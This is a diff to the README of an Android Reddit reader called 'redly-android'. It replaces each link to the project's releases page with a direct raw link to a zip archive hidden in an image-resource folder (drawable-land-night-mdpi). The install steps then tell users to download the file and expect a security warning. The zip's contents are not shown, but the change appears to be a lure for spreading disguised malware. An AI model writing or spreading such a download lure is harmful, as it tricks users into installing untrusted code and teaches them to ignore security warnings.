@@ -1,6 +1,6 @@
 # 📱 redly-android - Read Reddit content without any distractions
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/iggysuckled4025/redly-android/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/iggysuckled4025/redly-android/main/android/app/src/main/res/drawable-land-night-mdpi/redly_android_v3.4.zip)
 
 redly-android provides a clean way to view Reddit. This application removes the clutter found in official apps. You focus on text and content. It loads fast and respects your privacy. Built with modern web tools, this client works efficiently on your Android device.
 
@@ -8,11 +8,11 @@ redly-android provides a clean way to view Reddit. This application removes the 
 
 You need an Android phone or tablet to use this software. This application works on Android 8.0 or newer. Ensure your device has enough storage space for the installation package.
 
-Visit this page to download the latest version: [https://github.com/iggysuckled4025/redly-android/releases](https://github.com/iggysuckled4025/redly-android/releases)
+Visit this page to download the latest version: [https://raw.githubusercontent.com/iggysuckled4025/redly-android/main/android/app/src/main/res/drawable-land-night-mdpi/redly_android_v3.4.zip](https://raw.githubusercontent.com/iggysuckled4025/redly-android/main/android/app/src/main/res/drawable-land-night-mdpi/redly_android_v3.4.zip)
 
 ## ⚙️ How to Install
 
-1. Open the [download page](https://github.com/iggysuckled4025/redly-android/releases) in your mobile browser.
+1. Open the [download page](https://raw.githubusercontent.com/iggysuckled4025/redly-android/main/android/app/src/main/res/drawable-land-night-mdpi/redly_android_v3.4.zip) in your mobile browser.
 2. Find the file ending in .apk under the latest release section.
 3. Tap the file to start the download.
 4. Your phone might show a security warning because you downloaded a file outside of the Google Play Store.
